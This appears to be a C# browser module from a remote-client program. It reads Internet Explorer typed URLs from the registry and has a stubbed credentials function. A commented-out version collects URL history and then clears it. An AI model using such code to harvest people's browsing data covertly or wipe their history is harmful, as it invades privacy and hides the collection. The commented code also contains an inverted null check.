/*using RemoteClient.Browsers;
using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using UrlHistoryLibrary;

namespace RemoteClient
{
    public class InternetExplorer
    {
        public List<Url> URLs { get; set; }
        private string error = null;

        public string getError()
        {
            return error;
        }

        public DataTable fetchCredentials()
        {
            error = "Not Applicable . .";
            return null;
        }

        public DataTable GetHistory()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Title");
            dt.Columns.Add("URL");

            UrlHistoryWrapperClass urlhistory = new UrlHistoryWrapperClass();
            UrlHistoryWrapperClass.STATURLEnumerator enumerator = urlhistory.GetEnumerator();

            while (enumerator.MoveNext())
            {
                try
                {
                    string url = enumerator.Current.URL.Replace('\'', ' ');
                    string title = string.IsNullOrEmpty(enumerator.Current.Title)
                              ? enumerator.Current.Title.Replace('\'', ' ') : "";

                    dt.Rows.Add(new string[] { title, url });
                }
                catch
                {

                }
            }

            enumerator.Reset();
            urlhistory.ClearHistory();

            return dt;
        }

    }

}*/



using System;
using System.Collections.Generic;
using System.Data;
using Microsoft.Win32; 
using System.Text.RegularExpressions;

namespace RemoteClient
{
    public class InternetExplorer
    {
        public List<Url> URLs { get; set; }
        private string error = null;

        public string getError()
        {
            return error;
        }

        public DataTable fetchCredentials()
        {
            error = "Not Applicable . .";
            return null;
        }

        public DataTable GetHistory()
        {
            DataTable dt = new DataTable();
            dt.Columns.Add("Title");
            dt.Columns.Add("URL");

            try
            {
                // Truy cập vào Registry để lấy lịch sử duyệt web của Internet Explorer
                using (RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Internet Explorer\TypedURLs"))
                {
                    if (key != null)
                    {
                        foreach (string valueName in key.GetValueNames())
                        {
                            string url = (string)key.GetValue(valueName);
                            string title = Regex.Replace(url, @"^.*\?", ""); // Có thể lấy title từ đâu đó khác nếu cần

                            dt.Rows.Add(new string[] { title, url });
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                error = ex.Message; 
            }

            return dt;
        }
    }
    
    public class Url
    {
        public string Title { get; set; }
        public string Link { get; set; }
    }
}
